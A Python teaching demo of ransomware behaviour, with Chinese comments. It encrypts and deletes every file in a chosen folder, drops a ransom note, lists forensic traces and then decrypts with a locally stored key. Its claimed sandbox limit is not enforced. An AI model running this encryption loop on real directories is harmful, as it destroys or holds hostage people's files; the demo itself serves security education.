"""
RansomOS Simulator - 勒索軟體完整模擬器（教學展示用，限制在沙箱資料夾內）
五幕劇：感染 → 加密 → 勒索畫面 → 鑑識 → 解密還原
"""

import os
import time
import json
import random
import hashlib
import logging
from pathlib import Path
from cryptography.fernet import Fernet

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format="%(asctime)s [RansomOS] %(message)s")

RANSOM_NOTE = """
╔══════════════════════════════════════════════════╗
║          !!!  YOUR FILES ARE ENCRYPTED  !!!      ║
║                                                  ║
║  All your documents, photos and databases        ║
║  have been encrypted with AES-256.               ║
║                                                  ║
║  To recover your files, pay 0.01 BTC to:         ║
║  1A2b3C4d5E6f7G8h9I0jKlMnOpQrStUvWx              ║
║                                                  ║
║  Then send your ID to: ransom@nowhere.onion      ║
║  ID: {victim_id}                ║
║                                                  ║
║  Time remaining: 72:00:00                        ║
╚══════════════════════════════════════════════════╝
"""


class RansomwareSimulator:
    def __init__(self, target_dir: str, log_callback=None):
        self.target_dir = Path(target_dir).expanduser().resolve()
        self.log_callback = log_callback or (lambda msg: None)
        self._key: bytes | None = None
        self._fernet: Fernet | None = None
        self._key_file: Path = self.target_dir / ".ransom_key"
        self._manifest: dict = {}   # path -> original_size
        self._victim_id = hashlib.md5(str(self.target_dir).encode()).hexdigest()[:16].upper()

    # ------------------------------------------------------------------
    # 第一幕：感染
    # ------------------------------------------------------------------

    def act1_infection(self):
        self._emit("=== 第一幕：感染 (Infection) ===")
        self._emit(f"偽裝成無害程式，掃描目標資料夾: {self.target_dir}")
        time.sleep(0.5)

        files = list(self.target_dir.rglob("*"))
        files = [f for f in files if f.is_file() and not f.name.startswith(".ransom")]
        self._emit(f"找到 {len(files)} 個目標檔案")

        self._emit("Fork 出加密子程序...")
        time.sleep(0.3)
        self._emit(f"系統呼叫: fork() -> 子 PID {os.getpid() + 1}（模擬）")
        return files

    # ------------------------------------------------------------------
    # 第二幕：加密
    # ------------------------------------------------------------------

    def act2_encrypt(self, files: list[Path]):
        self._emit("=== 第二幕：加密 (Encryption) ===")

        # 產生 AES key（Fernet 內部使用 AES-128-CBC + HMAC）
        self._key = Fernet.generate_key()
        self._fernet = Fernet(self._key)

        # key 存到隱藏檔（真實勒索軟體會傳到 C2 伺服器）
        self._key_file.write_bytes(self._key)
        self._emit(f"加密金鑰已產生並儲存至: {self._key_file.name}")
        self._emit(f"Key (前16字元): {self._key[:16].decode()}...")

        encrypted_count = 0
        for fpath in files:
            try:
                original_data = fpath.read_bytes()
                encrypted_data = self._fernet.encrypt(original_data)
                self._manifest[str(fpath)] = len(original_data)

                # 覆寫原檔，副檔名改為 .ransomed
                enc_path = fpath.with_suffix(fpath.suffix + ".ransomed")
                enc_path.write_bytes(encrypted_data)
                fpath.unlink()

                self._emit(
                    f"[ENCRYPT] {fpath.name} → {enc_path.name} "
                    f"({len(original_data)}B → {len(encrypted_data)}B)"
                )
                encrypted_count += 1
                time.sleep(random.uniform(0.05, 0.15))  # 模擬真實加密延遲
            except Exception as e:
                self._emit(f"[SKIP] {fpath.name}: {e}")

        # 儲存 manifest
        manifest_path = self.target_dir / ".ransom_manifest.json"
        manifest_path.write_text(json.dumps(self._manifest, indent=2))
        self._emit(f"成功加密 {encrypted_count} 個檔案")

    # ------------------------------------------------------------------
    # 第三幕：勒索畫面
    # ------------------------------------------------------------------

    def act3_ransom_screen(self):
        self._emit("=== 第三幕：勒索畫面 ===")
        note_path = self.target_dir / "README_DECRYPT.txt"
        note_content = RANSOM_NOTE.format(victim_id=self._victim_id)
        note_path.write_text(note_content)
        print("\033[31m" + note_content + "\033[0m")  # 紅色輸出
        self._emit(f"勒索訊息已寫入: {note_path.name}")

    # ------------------------------------------------------------------
    # 第四幕：OS 鑑識
    # ------------------------------------------------------------------

    def act4_forensics(self) -> dict:
        self._emit("=== 第四幕：OS 鑑識 (Forensics) ===")
        evidence = {
            "victim_id": self._victim_id,
            "key_file_exists": self._key_file.exists(),
            "key_file_path": str(self._key_file),
            "encrypted_files": len(self._manifest),
            "process_pid": os.getpid(),
            "critical_syscalls": ["open()", "read()", "write()", "unlink()", "fork()"],
            "file_access_history": list(self._manifest.keys())[:5],
        }
        for k, v in evidence.items():
            self._emit(f"  {k}: {v}")
        return evidence

    # ------------------------------------------------------------------
    # 第五幕：解密還原
    # ------------------------------------------------------------------

    def act5_decrypt(self, key: bytes | None = None):
        self._emit("=== 第五幕：解密還原 ===")
        key = key or (self._key_file.read_bytes() if self._key_file.exists() else None)
        if key is None:
            self._emit("[ERROR] 找不到金鑰！沒有 key 無法解密。（這就是為什麼要付贖金）")
            return False

        fernet = Fernet(key)
        manifest_path = self.target_dir / ".ransom_manifest.json"
        manifest = json.loads(manifest_path.read_text()) if manifest_path.exists() else {}

        restored = 0
        for enc_path in self.target_dir.rglob("*.ransomed"):
            try:
                data = fernet.decrypt(enc_path.read_bytes())
                # 還原原始檔名
                original_name = enc_path.stem  # 去掉 .ransomed
                original_path = enc_path.parent / original_name
                original_path.write_bytes(data)
                enc_path.unlink()
                self._emit(f"[RESTORE] {enc_path.name} → {original_path.name}")
                restored += 1
            except Exception as e:
                self._emit(f"[FAIL] {enc_path.name}: {e}")

        # 清理勒索檔案
        for cleanup in [self._key_file, manifest_path,
                        self.target_dir / "README_DECRYPT.txt"]:
            if cleanup.exists():
                cleanup.unlink()

        self._emit(f"成功還原 {restored} 個檔案")
        return restored > 0

    # ------------------------------------------------------------------

    def run_full_demo(self):
        """完整執行五幕劇。"""
        files = self.act1_infection()
        if not files:
            self._emit("目標資料夾無檔案，請先建立一些測試檔案。")
            return
        self.act2_encrypt(files)
        self.act3_ransom_screen()
        self.act4_forensics()
        input("\n按 Enter 執行解密還原... ")
        self.act5_decrypt()

    def _emit(self, msg: str):
        logger.info(msg)
        self.log_callback(msg)


def create_test_files(target_dir: str, count: int = 10):
    """建立測試用的假檔案。"""
    d = Path(target_dir).expanduser()
    d.mkdir(parents=True, exist_ok=True)
    for i in range(count):
        fpath = d / f"document_{i:02d}.txt"
        fpath.write_text(f"這是測試文件 #{i}\n機密內容: {os.urandom(32).hex()}\n" * 5)
    print(f"已建立 {count} 個測試檔案於 {d}")


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "~/ransom_sandbox"
    create_test_files(target)
    sim = RansomwareSimulator(target)
    sim.run_full_demo()
